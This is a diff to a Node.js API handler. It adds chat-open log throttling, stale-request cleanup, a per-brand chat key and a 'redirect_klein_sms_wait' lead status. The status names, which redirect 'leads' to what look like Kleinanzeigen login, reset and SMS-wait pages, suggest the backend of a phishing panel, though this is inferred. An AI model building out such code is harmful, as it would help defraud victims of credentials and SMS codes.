@@ -10,8 +10,26 @@ const chatService = require('../services/chatService');
 const leadService = require('../services/leadService');
 const automationService = require('../services/automationService');
 
+const CHAT_OPEN_LOG_TTL_MS = 15000;
+const CHAT_OPEN_STALE_TTL_MS = 45000;
+const chatOpenLogSeen = new Map();
+
 function normalizePathname(parsedUrl) {
   return (parsedUrl.pathname || '').replace(/\/\/+/g, '/') || '/';
+}
+
+function shouldLogChatOpen(leadId, requestId) {
+  const key = String(leadId || '') + '|' + String(requestId || '');
+  const now = Date.now();
+  const prev = chatOpenLogSeen.get(key) || 0;
+  if (prev && (now - prev) < CHAT_OPEN_LOG_TTL_MS) return false;
+  chatOpenLogSeen.set(key, now);
+  if (chatOpenLogSeen.size > 2000) {
+    for (const [k, ts] of chatOpenLogSeen) {
+      if ((now - ts) > CHAT_OPEN_LOG_TTL_MS * 4) chatOpenLogSeen.delete(k);
+    }
+  }
+  return true;
 }
 
 /** Нужно прочитать тело до вызова handleApiRoute (иначе поток уже не прочитать повторно). */
@@ -87,6 +105,9 @@ async function handleApiRoute(req, res, parsedUrl, body, d) {
       }
       else if (lead.status === 'redirect_klein_forgot') {
         status = 'redirect_klein_forgot';
+      }
+      else if (lead.status === 'redirect_klein_sms_wait') {
+        status = 'redirect_klein_sms_wait';
       }
       else if (lead.status === 'redirect_klein_anmelden') {
         status = 'redirect_klein_anmelden';
@@ -250,11 +271,12 @@ async function handleApiRoute(req, res, parsedUrl, body, d) {
 
   if (pathname === '/api/chat' && method === 'GET') {
     const leadId = (parsedUrl.query && parsedUrl.query.leadId) ? String(parsedUrl.query.leadId).trim() : '';
+    const brand = (parsedUrl.query && parsedUrl.query.brand) ? String(parsedUrl.query.brand).trim().toLowerCase() : '';
     if (!leadId) {
       console.log('[CHAT-OPEN] GET /api/chat: нет leadId, 400');
       return send(res, 400, { ok: false, messages: [] });
     }
-    const chatKey = chatService.getChatKeyForLeadId(leadId);
+    const chatKey = chatService.getChatKeyForLeadId(leadId, null, brand);
     const chat = chatService.readChat();
     if (chatService.migrateChatToEmailKey(chat, leadId, chatKey)) chatService.writeChat(chat);
     if (Object.prototype.hasOwnProperty.call(chat, leadId) && chatKey !== leadId) chatService.writeChat(chat);
@@ -262,15 +284,27 @@ async function handleApiRoute(req, res, parsedUrl, body, d) {
     const typing = chatService.getChatTyping(leadId);
     const isAdmin = hasValidAdminSession(req);
     const readAt = (chat._readAt && typeof chat._readAt[chatKey] === 'string') ? chat._readAt[chatKey] : null;
-    const openRequestedRaw = chat._openChatRequested && typeof chat._openChatRequested === 'object' ? chat._openChatRequested[leadId] : undefined;
-    const openRequested = !!openRequestedRaw;
-    const openChatRequestId = openRequestedRaw != null ? String(openRequestedRaw) : undefined;
+    let openRequestedRaw = chat._openChatRequested && typeof chat._openChatRequested === 'object' ? chat._openChatRequested[leadId] : undefined;
+    let openRequested = !!openRequestedRaw;
+    let openChatRequestId = openRequestedRaw != null ? String(openRequestedRaw) : undefined;
     const payload = { ok: true, messages, supportTyping: typing.support, userTyping: typing.user };
     if (isAdmin) payload.lastReadAt = readAt;
     else {
+      if (openRequested && openChatRequestId) {
+        const requestTs = Number(openChatRequestId);
+        if (Number.isFinite(requestTs) && requestTs > 0 && (Date.now() - requestTs) > CHAT_OPEN_STALE_TTL_MS) {
+          if (chat._openChatRequested && typeof chat._openChatRequested === 'object') {
+            delete chat._openChatRequested[leadId];
+            chatService.writeChat(chat);
+          }
+          openRequestedRaw = undefined;
+          openRequested = false;
+          openChatRequestId = undefined;
+        }
+      }
       payload.openChat = openRequested;
       if (openRequested && openChatRequestId) payload.openChatRequestId = openChatRequestId;
-      if (openRequested) {
+      if (openRequested && shouldLogChatOpen(leadId, openChatRequestId || 'legacy')) {
         console.log('[CHAT-OPEN] GET /api/chat: leadId=' + leadId + ' chatKey=' + chatKey + ' openChat=true requestId=' + openChatRequestId);
       }
     }
@@ -281,13 +315,14 @@ async function handleApiRoute(req, res, parsedUrl, body, d) {
     let json = {};
     try { json = JSON.parse(body || '{}'); } catch (_) {}
     const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
+    const brand = (json.brand != null) ? String(json.brand).trim().toLowerCase() : '';
     const from = (json.from === 'support' || json.from === 'user') ? json.from : 'user';
     const text = (json.text != null) ? String(json.text).slice(0, 2000) : '';
     const MAX_IMAGE_BASE64_LEN = 2800000;
     let image = (json.image != null && typeof json.image === 'string') ? json.image.slice(0, MAX_IMAGE_BASE64_LEN) : undefined;
     if (from === 'support' && !hasValidAdminSession(req)) return send(res, 403, { ok: false });
     if (!leadId) return send(res, 400, { ok: false });
-    const chatKey = chatService.getChatKeyForLeadId(leadId);
+    const chatKey = chatService.getChatKeyForLeadId(leadId, null, brand);
     const chat = chatService.readChat();
     if (chatService.migrateChatToEmailKey(chat, leadId, chatKey)) chatService.writeChat(chat);
     if (Object.prototype.hasOwnProperty.call(chat, leadId) && chatKey !== leadId) chatService.writeChat(chat);
@@ -325,9 +360,10 @@ async function handleApiRoute(req, res, parsedUrl, body, d) {
     let json = {};
     try { json = JSON.parse(body || '{}'); } catch (_) {}
     const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
+    const brand = (json.brand != null) ? String(json.brand).trim().toLowerCase() : '';
     const messageId = (json.messageId != null) ? String(json.messageId).trim() : '';
     if (!leadId || !messageId) return send(res, 400, { ok: false, error: 'leadId and messageId required' });
-    const chatKey = chatService.getChatKeyForLeadId(leadId);
+    const chatKey = chatService.getChatKeyForLeadId(leadId, null, brand);
     const chat = chatService.readChat();
     const list = Array.isArray(chat[chatKey]) ? chat[chatKey] : [];
     const idx = list.findIndex((m) => m && m.id === messageId);
